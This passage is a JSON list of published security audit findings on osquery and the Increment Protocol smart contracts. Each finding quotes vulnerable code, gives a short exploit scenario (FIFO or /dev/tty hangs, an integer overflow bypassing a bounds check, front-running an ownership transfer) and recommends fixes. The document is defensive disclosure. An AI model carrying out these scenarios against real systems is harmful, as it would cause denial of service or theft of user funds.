        "description": "To support several macOS-specic tables, osquery contains a function called osquery::parsePlist, which reads and parses property list (.plist) les by using the Apple Foundation framework class NSPropertyListSerialization. The parsePlist function is used by tables such as browser_plugins and xprotect_reports to read user-accessible les. The function does not have any limit on the amount of data that it will parse. id ns_path = [NSString stringWithUTF8String:path.string().c_str()]; id stream = [NSInputStream inputStreamWithFileAtPath:ns_path]; if (stream == nil) { return Status(1, \"Unable to read plist: \" + path.string()); } // Read file content into a data object, containing potential plist data. NSError* error = nil; [stream open]; id plist_data = [NSPropertyListSerialization propertyListWithStream:stream options:0 format:NULL error:&error]; Figure 7.1: The parsePlist implementation does not have a limit on the amount of data that it can deserialize. 26 Atlassian: osquery Security Assessment auto info_path = path + \"/Contents/Info.plist\"; // Ensure that what we're processing is actually a plug-in. if (!pathExists(info_path)) { return; } if (osquery::parsePlist(info_path, tree).ok()) { // Plugin did not include an Info.plist, or it was invalid for (const auto& it : kBrowserPluginKeys) { r[it.second] = tree.get(it.first, \"\"); // Convert bool-types to an integer. jsonBoolAsInt(r[it.second]); } } Figure 7.2: browser_plugins uses parsePlist on user-controlled les. Exploit Scenario An attacker crafts a large, valid .plist le and stores it in ~/Library/Internet Plug-Ins/foo/Contents/Info.plist on a macOS system running the osquery daemon. When osquery executes a query using the browser_plugins table, it reads and parses the complete le, causing high resource consumption. Recommendations Short term, modify the browser_plugins and xprotect_reports tables to enforce a maximum le size (e.g., by combining readFile and parsePlistContent). Long term, to prevent this issue in future tables, consider removing the parsePlist function or rewriting it as a helper function around a safer implementation. 27 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. The parsePlist function can hang on reading certain les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The osquery codebase contains a function called osquery::parsePlist, which reads and parses .plist les. This function opens the target le directly by using the inputStreamWithFileAtPath method from NSInputStream, as shown in gure 7.1 in the previous nding, and passes the resulting input stream to NSPropertyListSerialization for direct consumption. However, parsePlist can hang on reading certain les. For example, if the le to be read is a FIFO, the function blocks the osquery thread until another program or thread opens the FIFO to write to it. Exploit Scenario An attacker creates a FIFO le on a macOS device in ~/Library/Internet Plug-Ins/foo/Contents/Info.plist or ~/Library/Logs/DiagnosticReports/XProtect-foo using the mkfifo command. The osquery agent attempts to open and read the le when building a response for queries on the browser_plugins and xprotect_reports tables, but parsePlist blocks the osquery thread indenitely, leaving osquery unable to respond to the query request. Recommendations Short term, implement a check in parsePlist to verify that the .plist le to be read is not a special le. Long term, introduce a timeout on le operations so that a block does not stall the osquery thread. Also consider replacing parsePlist in favor of the parsePlistContent function and standardizing all le reads on a single code path to prevent similar issues going forward. 28 Atlassian: osquery Security Assessment 9. The parseJSON function can hang on reading certain les on Linux and macOS Severity: Medium Diculty: Low Type: Denial of Service Finding ID: TOB-ATL-9 Target: osquery/filesystem/filesystem.cpp",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. No limit on the amount of data read or expanded from the Safari extensions table ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The safari_extensions table allows the agent to query installed Safari extensions on a certain user prole. Said extensions consist of extensible archive format (XAR) compressed archives with the .safariextz le extension, which are stored in the ~/Library/Safari/Extensions folder. The osquery program does not have a limit on the amount of data that can be processed when reading and inating the Safari extension contents; a large amount of data may cause a denial of service. 31 Atlassian: osquery Security Assessment xar_t xar = xar_open(path.c_str(), READ); if (xar == nullptr) { TLOG << \"Cannot open extension archive: \" << path; return; } xar_iter_t iter = xar_iter_new(); xar_file_t xfile = xar_file_first(xar, iter); size_t max_files = 500; for (size_t index = 0; index < max_files; ++index) { if (xfile == nullptr) { break; } char* xfile_path = xar_get_path(xfile); if (xfile_path == nullptr) { break; } // Clean up the allocated content ASAP. std::string entry_path(xfile_path); free(xfile_path); if (entry_path.find(\"Info.plist\") != std::string::npos) { if (xar_verify(xar, xfile) != XAR_STREAM_OK) { TLOG << \"Extension info extraction failed verification: \" << path; } size_t size = 0; char* buffer = nullptr; if (xar_extract_tobuffersz(xar, xfile, &buffer, &size) != 0 || size == 0) { break; } std::string content(buffer, size); free(buffer); pt::ptree tree; if (parsePlistContent(content, tree).ok()) { for (const auto& it : kSafariExtensionKeys) { r[it.second] = tree.get(it.first, \"\"); } } break; } 32 Atlassian: osquery Security Assessment xfile = xar_file_next(iter); } Figure 10.1: genSafariExtension extracts the full Info.plist to memory. Exploit Scenario An attacker crafts a valid extension containing a large Info.plist le and stores it in ~/Library/Safari/Extensions/foo.safariextz. When the osquery agent attempts to respond to a query on the safari_extensions table, it opens the archive and expands the full Info.plist le in memory, causing high resource consumption. Recommendations Short term, enforce a limit on the amount of information that can be extracted from an XAR archive. Long term, add guidelines to the development documentation on handling untrusted input data. For instance, advise developers to limit the amount of data that may be ingested, processed, or read from untrusted sources such as user-writable les. Enforce said guidelines by performing code reviews on new contributions. 33 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Extended attributes table may read uninitialized or out-of-bounds memory ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The extended_attributes table calls the listxattr function twice: rst to query the extended attribute list size and then to actually retrieve the list of attribute names. Additionally, the return values from the function calls are not checked for errors. This leads to a race condition in the parseExtendedAttributeList osquery function, in which the content buer is left uninitialized if the target le is deleted in the time between the two listxattr calls. As a result, std::string will consume uninitialized and unbounded memory, potentially leading to out-of-bounds memory reads. std::vector<std::string> attributes; ssize_t value = listxattr(path.c_str(), nullptr, (size_t)0, 0); char* content = (char*)malloc(value); if (content == nullptr) { return attributes; } ssize_t ret = listxattr(path.c_str(), content, value, 0); if (ret == 0) { free(content); return attributes; } char* stable = content; do { attributes.push_back(std::string(content)); content += attributes.back().size() + 1; } while (content - stable < value); free(stable); return attributes; Figure 11.1: parseExtendedAttributeList calls listxattr twice. 34 Atlassian: osquery Security Assessment Exploit Scenario An attacker creates and runs a program to race osquery while it is fetching extended attributes from the le system. The attacker is successful and causes the osquery agent to crash with a segmentation fault. Recommendations Short term, rewrite the aected code to check the return values for errors. Replace listxattr with flistxattr, which operates on opened le descriptors, allowing it to continue to query extended attributes even if the le is removed (unlink-ed) from the le system. Long term, establish and enforce best practices for osquery contributions by leveraging automated tooling and code reviews to prevent similar issues from reoccurring. For example, use le descriptors instead of le paths when you need to perform more than one operation on a le to ensure that the le is not deleted or replaced mid-operation. Consider using static analysis tools such as CodeQL to look for other instances of similar issues in the code and to detect new instances of the problem on new contributions. 35 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. The readFile function can hang on reading a le ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The readFile function is used to provide a standardized way to read les. It uses the read_max variable to prevent the functions from reading excessive amounts of data. It also selects one of two modes, blocking or non-blocking, depending on the le properties. When using the blocking approach, it reads block_size-sized chunks of the le, with a minimum of 4,096 bytes, and returns the chunks to the caller. However, the call to read can block the osquery thread when reading certain les. if (handle.blocking_io) { // Reset block size to a sane minimum. block_size = (block_size < 4096) ? 4096 : block_size; ssize_t part_bytes = 0; bool overflow = false; do { std::string part(block_size, '\\0'); part_bytes = handle.fd->read(&part[0], block_size); if (part_bytes > 0) { total_bytes += static_cast<off_t>(part_bytes); if (total_bytes >= read_max) { return Status::failure(\"File exceeds read limits\"); } if (file_size > 0 && total_bytes > file_size) { overflow = true; part_bytes -= (total_bytes - file_size); } predicate(part, part_bytes); } } while (part_bytes > 0 && !overflow); } else { Figure 12.1: The blocking_io ow can stall. 36 Atlassian: osquery Security Assessment Exploit Scenario An attacker creates a symlink to /dev/tty in a path known to be read by the osquery agent. When the osquery agent attempts to read the le, it stalls. Recommendations Short term, ensure that the le operations in filesystem.cpp do not block the osquery thread. Long term, introduce a timeout on le operations so that a block does not stall the osquery thread. 37 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. The POSIX PlatformFile constructor may block the osquery thread ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The POSIX implementation of PlatformFiles constructor uses the open syscall to obtain a handle to the le. If the le to be opened is a FIFO, the call to open blocks the osquery thread unless the O_NONBLOCK ag is used. There are several places in the codebase in which the constructor is called without the PF_NONBLOCK ag set; all of these calls may stall on opening a FIFO. PlatformFile::PlatformFile(const fs::path& path, int mode, int perms) : fname_(path) { ... if ((mode & PF_NONBLOCK) == PF_NONBLOCK) { oflag |= O_NONBLOCK; is_nonblock_ = true; } if ((mode & PF_APPEND) == PF_APPEND) { oflag |= O_APPEND; } if (perms == -1 && may_create) { perms = 0666; } boost::system::error_code ec; if (check_existence && (!fs::exists(fname_, ec) || ec.value() != errc::success)) { handle_ = kInvalidHandle; } else { handle_ = ::open(fname_.c_str(), oflag, perms); } } Figure 13.1: The POSIX PlatformFile constructor 38 Atlassian: osquery Security Assessment ./filesystem/file_compression.cpp:26: PlatformFile inFile(in, PF_OPEN_EXISTING | PF_READ); ./filesystem/file_compression.cpp:32: PlatformFile outFile(out, PF_CREATE_ALWAYS | PF_WRITE); ./filesystem/file_compression.cpp:102: PlatformFile inFile(in, PF_OPEN_EXISTING | PF_READ); ./filesystem/file_compression.cpp:108: PlatformFile outFile(out, PF_CREATE_ALWAYS | PF_WRITE); ./filesystem/file_compression.cpp:177: PlatformFile pFile(f, PF_OPEN_EXISTING | PF_READ); ./filesystem/filesystem.cpp:242: PlatformFile fd(path, PF_OPEN_EXISTING | PF_WRITE); ./filesystem/filesystem.cpp:258: PlatformFile fd(path, PF_OPEN_EXISTING | PF_READ); ./filesystem/filesystem.cpp:531: PlatformFile fd(path, PF_OPEN_EXISTING | PF_READ); ./carver/carver.cpp:230: PlatformFile src(srcPath, PF_OPEN_EXISTING | PF_READ); Figure 13.2: Uses of PlatformFile without PF_NONBLOCK Exploit Scenario An attacker creates a FIFO le that is opened by one of the functions above, stalling the osquery agent. Recommendations Short term, investigate the uses of PlatformFile to identify possible blocks. Long term, use a static analysis tool such as CodeQL to scan the code for instances in which uses of the open syscall block the osquery thread. 39 Atlassian: osquery Security Assessment 14. No limit on the amount of data the Carver::blockwiseCopy method can write Severity: Medium Diculty: Low Type: Denial of Service Finding ID: TOB-ATL-14 Target: osquery/carver/carver.cpp",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. The carves table truncates large le sizes to 32 bits ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The enumerateCarves function uses rapidjson::Value::GetInt() to retrieve a size value from a JSON string. The GetInt return type is int, so it cannot represent sizes exceeding 32 bits; as a result, the size of larger les will be truncated. void enumerateCarves(QueryData& results, const std::string& new_guid) { std::vector<std::string> carves; scanDatabaseKeys(kCarves, carves, kCarverDBPrefix); for (const auto& carveGuid : carves) { std::string carve; auto s = getDatabaseValue(kCarves, carveGuid, carve); if (!s.ok()) { VLOG(1) << \"Failed to retrieve carve GUID\"; continue; } JSON tree; s = tree.fromString(carve); if (!s.ok() || !tree.doc().IsObject()) { VLOG(1) << \"Failed to parse carve entries: \" << s.getMessage(); return; } Row r; if (tree.doc().HasMember(\"time\")) { r[\"time\"] = INTEGER(tree.doc()[\"time\"].GetUint64()); } if (tree.doc().HasMember(\"size\")) { r[\"size\"] = INTEGER(tree.doc()[\"size\"].GetInt()); } stringToRow(\"sha256\", r, tree); 42 Atlassian: osquery Security Assessment stringToRow(\"carve_guid\", r, tree); stringToRow(\"request_id\", r, tree); stringToRow(\"status\", r, tree); stringToRow(\"path\", r, tree); // This table can be used to request a new carve. // If this is the case then return this single result. auto new_request = (!new_guid.empty() && new_guid == r[\"carve_guid\"]); r[\"carve\"] = INTEGER((new_request) ? 1 : 0); results.push_back(r); } } } // namespace Figure 15.1: The enumerateCarves function truncates les of large sizes. Exploit Scenario An attacker creates a le on disk of a size that overows 32 bits by only a small amount, such as 0x100001336. The carves tables reports the le size incorrectly as 0x1336 bytes. The attacker bypasses checks based on the reported le size. Recommendations Short term, use GetUint64 instead of GetInt to retrieve the le size. Long term, use static analysis tools such as CodeQL to look for other instances in which a type of size int is retrieved from JSON and stored in an INTEGER eld. 43 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "16. The time table may not null-terminate strings correctly ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The osquery time table uses strftime to format time information, such as the time zone name, into user-friendly strings. If the amount of information to be written does not t in the provided buer, strftime returns zero and leaves the buer contents in an undened state. QueryData genTime(QueryContext& context) { Row r; time_t osquery_time = getUnixTime(); struct tm gmt; gmtime_r(&osquery_time, &gmt); struct tm now = gmt; auto osquery_timestamp = toAsciiTime(&now); char local_timezone[5] = {0}; { } struct tm local; localtime_r(&osquery_time, &local); strftime(local_timezone, sizeof(local_timezone), \"%Z\", &local); char weekday[10] = {0}; strftime(weekday, sizeof(weekday), \"%A\", &now); char timezone[5] = {0}; strftime(timezone, sizeof(timezone), \"%Z\", &now); Figure 16.1: genTime uses strftime to get the time zone name and day of the week. The strings to be written vary depending on the locale conguration, so some strings may not t in the provided buer. The code does not check the return value of strftime and assumes that the string buer is always null-terminated, which may not always be the case. 44 Atlassian: osquery Security Assessment Exploit Scenario An attacker nds a way to change the time zone on a system in which %Z shows the full time zone name. When the osquery agent attempts to respond to a query on the time table, it triggers undened behavior. Recommendations Short term, add a check to verify the return value of each strftime call made by the table implementation. If the function returns zero, ensure that the system writes a valid string in the buer before it is used as part of the table response. Long term, perform code reviews on new contributions and consider using automated code analysis tools to prevent these kinds of issues from reoccurring. 45 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. The elf_info table can crash the osquery agent ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The elf_info table uses the libelfin library to read properties of ELF les. The library maps the entire ELF binary into virtual memory and then uses memory accesses to read the data. Specically, the load method of the mmap_loader class returns a pointer to the data for a given oset and size. To ensure that the memory access stays within the bounds of the memory-mapped le, the library checks that the result of adding the oset and the size is less than the size of the le. However, this check does not account for the possibility of overows in the addition operation. For example, an oset of 0xffffffffffffffff and a size of 1 would overow to the value 0. This makes it possible to bypass the check and to create references to memory outside of the bounds. The elf_info table indirectly uses this function when loading section headers from an ELF binary. class mmap_loader : public loader { public: void *base; size_t lim; mmap_loader(int fd) { off_t end = lseek(fd, 0, SEEK_END); if (end == (off_t)-1) throw system_error(errno, system_category(), \"finding file length\"); lim = end; base = mmap(nullptr, lim, PROT_READ, MAP_SHARED, fd, 0); if (base == MAP_FAILED) throw system_error(errno, system_category(), \"mmap'ing file\"); close(fd); } ... 46 Atlassian: osquery Security Assessment const void *load(off_t offset, size_t size) { } }; if (offset + size > lim) throw range_error(\"offset exceeds file size\"); return (const char*)base + offset; Figure 17.1: The libenfin librarys limit check does not account for overows. Exploit Scenario An attacker knows of a writable path in which osquery scans ELF binaries. He creates a malformed ELF binary, causing the pointer returned by the vulnerable function to point to an arbitrary location. He uses this to make the osquery agent crash, leak information from the process memory, or circumvent address space layout randomization (ASLR). Recommendations Short term, work with the developers of the libelfbin project to account for overows in the check. Long term, implement the recommendations in TOB-ATL-2 to minimize the impact of similar issues. 47 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Governance role is a single point of failure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "Because the governance role is centralized and responsible for critical functionalities, it constitutes a single point of failure within the Increment Protocol. The role can perform the following privileged operations:        Whitelisting a perpetual market Setting economic parameters Updating price oracle addresses and setting xed prices for assets Managing protocol insurance funds Updating the addresses of core contracts Adding support for new reserve tokens to the UA contract Pausing and unpausing protocol operations These privileges give governance complete control over the protocol and therefore access to user and protocol funds. This increases the likelihood that the governance account will be targeted by an attacker and incentivizes governance to act maliciously. Note, though, that the governance role is currently controlled by a multisignature wallet (a multisig) and that control may be transferred to a decentralized autonomous organization (DAO) in the future. Exploit Scenario Eve, an attacker, creates a fake token, compromises the governance account, and adds the fake token as a reserve token for UA. She mints UA by making a deposit of the fake token and then burns the newly acquired UA tokens, which enables her to withdraw all USDC from the reserves. Recommendations Short term, minimize the privileges of the governance role and update the documentation to include the implications of those privileges . Additionally, implement reasonable time delays for privileged operations. Long term, document an incident response plan and ensure that the private keys for the multisig are managed safely. Additionally, carefully evaluate the risks of moving from a multisig to a DAO and consider whether the move is necessary.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Inconsistent lower bounds on collateral weights ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "The lower bound on a collateral assets initial weight (when the collateral is rst whitelisted) is dierent from that enforced if the weight is updated; this discrepancy increases the likelihood of collateral seizures by liquidators. A collateral assets weight represents the level of risk associated with accepting that asset as collateral. This risk calculation comes into play when the protocol is assessing whether a liquidator can seize a users non-UA collateral. To determine the value of each collateral asset, the protocol multiplies the users balance of that asset by the collateral weight (a percentage). A riskier asset will have a lower weight and thus a lower value. If the total value of a users non-UA collateral is less than the users UA debt, a liquidator can seize the collateral. When whitelisting a collateral asset, the Perpetual.addWhiteListedCollateral function requires the collateral weight to be between 10% and 100% (gure 2.1). According to the documentation, these are the correct bounds for a collateral assets weight. function addWhiteListedCollateral ( IERC20Metadata asset, uint256 weight , uint256 maxAmount ) public override onlyRole(GOVERNANCE) { if (weight < 1e17) revert Vault_InsufficientCollateralWeight(); if (weight > 1e18) revert Vault_ExcessiveCollateralWeight(); [...] } Figure 2.1: A snippet of the addWhiteListedCollateral function in Vault.sol#L224-230 However, governance can choose to update that weight via a call to Perpetual.changeCollateralWeight , which allows the weight to be between 1% and 100% (gure 2.2). function changeCollateralWeight (IERC20Metadata asset, uint256 newWeight ) external override onlyRole(GOVERNANCE) { uint256 tokenIdx = tokenToCollateralIdx[asset]; if (!((tokenIdx != 0 ) || ( address (asset) == address (UA)))) revert Vault_UnsupportedCollateral(); if (newWeight < 1e16) revert Vault_InsufficientCollateralWeight(); if (newWeight > 1e18) revert Vault_ExcessiveCollateralWeight(); [...] } Figure 2.2: A snippet of the changeCollateralWeight function in Vault.sol#L254-259 If the weight of a collateral asset were mistakenly set to less than 10%, the value of that collateral would decrease, thereby increasing the likelihood of seizures of non-UA collateral. Exploit Scenario Alice, who holds the governance role, decides to update the weight of a collateral asset in response to volatile market conditions. By mistake, Alice sets the weight of the collateral to 1% instead of 10%. As a result of this change, Bobs non-UA collateral assets decrease in value and are seized. Recommendations Short term, change the lower bound on newWeight in the changeCollateralWeight function from 1e16 to 1e17 . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "The Increment Protocol contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. Security issues due to optimization bugs have occurred in the past . A medium- to high-severity bug in the Yul optimizer was introduced in Solidity version 0.8.13 and was xed only recently, in Solidity version 0.8.17 . Another medium-severity optimization bugone that caused memory writes in inline assembly blocks to be removed under certain conditions was patched in Solidity 0.8.15. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the Increment Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Support for multiple reserve tokens allows for arbitrage ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "Because the UA token contract supports multiple reserve tokens, it can be used to swap one reserve token for another at a ratio of 1:1. This creates an arbitrage opportunity, as it enables users to swap reserve tokens with dierent prices. Users can deposit supported reserve tokens in the UA contract in exchange for UA tokens at a 1:1 ratio (gure 4.1). function mintWithReserve ( uint256 tokenIdx , uint256 amount ) external override { // Check that the reserve token is supported if (tokenIdx > reserveTokens.length - 1 ) revert UA_InvalidReserveTokenIndex(); ReserveToken memory reserveToken = reserveTokens[tokenIdx]; // Check that the cap of the reserve token isn't reached uint256 wadAmount = LibReserve.tokenToWad(reserveToken.asset.decimals(), amount); if (reserveToken.currentReserves + wadAmount > reserveToken.mintCap) revert UA_ExcessiveTokenMintCapReached(); _mint( msg.sender , wadAmount); reserveTokens[tokenIdx].currentReserves += wadAmount; reserveToken.asset.safeTransferFrom( msg.sender , address ( this ), amount); } Figure 4.1: The mintWithReserve function in UA.sol#L38-51 Similarly, users can withdraw the amount of a deposit by returning their UA in exchange for any supported reserve token, also at a 1:1 ratio (gure 4.2). function withdraw ( uint256 tokenIdx , uint256 amount ) external override { // Check that the reserve token is supported if (tokenIdx > reserveTokens.length - 1 ) revert UA_InvalidReserveTokenIndex(); IERC20Metadata reserveTokenAsset = reserveTokens[tokenIdx].asset; _burn( msg.sender , amount); reserveTokens[tokenIdx].currentReserves -= amount; uint256 tokenAmount = LibReserve.wadToToken(reserveTokenAsset.decimals(), amount); reserveTokenAsset.safeTransfer( msg.sender , tokenAmount); } Figure 4.2: The withdraw function in UA.sol#L56-66 Thus, a user could mint UA by depositing a less valuable reserve token and then withdraw the same amount of a more valuable token in one transaction, engaging in arbitrage. Exploit Scenario Alice, who holds the governance role, adds USDC and DAI as reserve tokens. Eve notices that DAI is trading at USD 0.99, while USDC is trading at USD 1.00. Thus, she decides to mint a large amount of UA by depositing DAI and to subsequently return the DAI and withdraw USDC, allowing her to make a risk-free prot. Recommendations Short term, document all front-running and arbitrage opportunities in the protocol to ensure that users are aware of them. As development continues, reassess the risks associated with those opportunities and evaluate whether they could adversely aect the protocol . Long term, implement an o-chain monitoring solution (like that detailed in TOB-INC-13 ) to detect any anomalous uctuations in the prices of supported reserve tokens. Additionally, develop an incident response plan to ensure that any issues that arise can be addressed promptly and without confusion. (See appendix D for additional details on creating an incident response plan.)",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Ownership transfers can be front-run ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "The PerpOwnable contract provides an access control mechanism for the minting and burning of a Perpetual contracts vBase or vQuote tokens. The owner of these token contracts is set via the transferPerpOwner function, which assigns the owners address to the perp state variable. This function is designed to be called only once, during deployment, to set the Perpetual contract as the owner of the tokens. Then, as the tokens owner, the Perpetual contract can mint / burn tokens during liquidity provisions, trades, and liquidations. However, because the function is external, anyone can call it to set his or her own malicious address as perp , taking ownership of a contracts vBase or vQuote tokens. function transferPerpOwner ( address recipient ) external { if (recipient == address ( 0 )) revert PerpOwnable_TransferZeroAddress(); if (perp != address ( 0 )) revert PerpOwnable_OwnershipAlreadyClaimed(); perp = recipient; emit PerpOwnerTransferred( msg.sender , recipient); } Figure 5.1: The transferPerpOwner function in PerpOwnable.sol#L29-L35 If the call were front-run, the Perpetual contract would not own the vBase or vQuote tokens, and any attempts to mint / burn tokens would revert. Since all user interactions require the minting or burning of tokens, no liquidity provisions, trades, or liquidations would be possible; the market would be eectively unusable. An attacker could launch such an attack upon every perpetual market deployment to cause a denial of service (DoS). Exploit Scenario Alice, an admin of the Increment Protocol, deploys a new Perpetual contract. Alice then attempts to call transferPerpOwner to set perp to the address of the deployed contract. However, Eve, an attacker monitoring the mempool, sees Alices call to transferPerpOwner and calls the function with a higher gas price. As a result, Eve gains ownership of the virtual tokens and renders the perpetual market useless. Eve then repeats the process with each subsequent deployment of a perpetual market, executing a DoS attack. Recommendations Short term, move all functionality from the PerpOwnable contract to the Perpetual contract. Then add the hasRole modier to the transferPerpOwner function so that the function can be called only by the manager or governance role. Long term, document all cases in which front-running may be possible, along with the implications of front-running for the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Funding payments are made in the wrong token ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "The funding payments owed to users are made in vBase instead of UA tokens; this results in incorrect calculations of users prot-and-loss (PnL) values, an increased risk of liquidations, and a delay in the convergence of a Perpetual contracts value with that of the underlying base asset. When the protocol executes a trade or liquidity provision, one of its rst steps is settling the funding payments that are due to the calling user. To do that, it calls the _settleUserFundingPayments function in the ClearingHouse contract (gure 6.1). The function sums the funding payments due to the user (as a trader and / or a liquidity provider) across all perpetual markets. Once the function has determined the nal funding payment due to the user ( fundingPayments ), the Vault contracts settlePnL function changes the UA balance of the user. function _settleUserFundingPayments( address account) internal { int256 fundingPayments; uint256 numMarkets = getNumMarkets(); for ( uint256 i = 0 ; i < numMarkets; ) { fundingPayments += perpetuals[i].settleTrader(account) + perpetuals[i].settleLp(account); unchecked { ++i; } } if (fundingPayments != 0 ) { vault.settlePnL(account, fundingPayments); } } Figure 6.1: The _settleUserFundingPayments function in ClearingHouse.sol#L637- Both the Perpetual.settleTrader and Perpetual.settleLp functions internally call _getFundingPayments to calculate the funding payment due to the user for a given market (gure 6.2). function _getFundingPayments( bool isLong, int256 userCumFundingRate, int256 globalCumFundingRate, int256 vBaseAmountToSettle ) internal pure returns ( int256 upcomingFundingPayment) { [...] if (userCumFundingRate != globalCumFundingRate) { int256 upcomingFundingRate = isLong ? userCumFundingRate - globalCumFundingRate : globalCumFundingRate - userCumFundingRate; // fundingPayments = fundingRate * vBaseAmountToSettle upcomingFundingPayment = upcomingFundingRate.wadMul(vBaseAmountToSettle); } } Figure 6.2: The _getFundingPayments function in Perpetual.sol#L1152-1173 However, the upcomingFundingPayment value is expressed in vBase, since it is the product of a percentage, which is unitless, and a vBase token amount, vBaseAmountToSettle . Thus, the fundingPayments value that is calculated in _settleUserFundingPayments is also expressed in vBase. However, the settlePnL function internally updates the users balance of UA, not vBase. As a result, the users UA balance will be incorrect, since the users prot or loss may be signicantly higher or lower than it should be. This discrepancy is a function of the price dierence between the vBase and UA tokens. The use of vBase tokens for funding payments causes three issues. First, when withdrawing UA tokens, the user may lose or gain much more than expected. Second, since the UA balance aects the users collateral reserve total, the balance update may increase or decrease the users risk of liquidation. Finally, since funding payments are not made in the notional asset, the convergence between the mark and index prices may be delayed. Exploit Scenario The BTC / USD perpetual markets mark price is signicantly higher than the index price. Alice, who holds a short position, decides to exit the market. However, the protocol calculates her funding payments in BTC and does not convert them to their UA equivalents before updating her balance. Thus, Alice makes much less than expected. Recommendations Short term, use the vBase.indexPrice() function to convert vBase token amounts to UA before the call to vault.settlePnL . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Excessive dust collection may lead to premature closures of long positions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "description": "The upper bound on the amount of funds considered dust by the protocol may lead to the premature closure of long positions. The protocol collects dust to encourage complete closures instead of closures that leave a position with a small balance of vBase. One place that dust collection occurs is the Perpetual contracts _reducePositionOnMarket function (gure 7.1). function _reducePositionOnMarket ( LibPerpetual.TraderPosition memory user, bool isLong , uint256 proposedAmount , uint256 minAmount ) internal returns ( int256 baseProceeds , int256 quoteProceeds , int256 addedOpenNotional , int256 pnl ) { int256 positionSize = int256 (user.positionSize); uint256 bought ; uint256 feePer ; if (isLong) { quoteProceeds = -(proposedAmount.toInt256()); (bought, feePer) = _quoteForBase(proposedAmount, minAmount); baseProceeds = bought.toInt256(); } else { (bought, feePer) = _baseForQuote(proposedAmount, minAmount); quoteProceeds = bought.toInt256(); baseProceeds = -(proposedAmount.toInt256()); } int256 netPositionSize = baseProceeds + positionSize; if (netPositionSize > 0 && netPositionSize <= 1e17) { _donate(netPositionSize.toUint256()); baseProceeds -= netPositionSize; } [...] } Figure 7.1: The _reducePositionOnMarket function in Perpetual.sol#L876-921 If netPositionSize , which represents a users position after its reduction, is between 0 and 1e17 (1/10 of an 18-decimal token), the system will treat the position as closed and donate the dust to the insurance protocol. This will occur regardless of whether the user intended to reduce, rather than fully close, the position. (Note that netPositionSize is positive if the overall position is long. The dust collection mechanism used for short positions is discussed in TOB-INC-11 .) However, if netPositionSize is tracking a high-value token, the donation to Insurance will no longer be insignicant; 1/10 of 1 vBTC, for instance, would be worth ~USD 2,000 (at the time of writing). Thus, the donation of a users vBTC dust (and the resultant closure of the vBTC position) could prevent the user from proting o of a ~USD 2,000 position. Exploit Scenario Alice, who holds a long position in the vBTC / 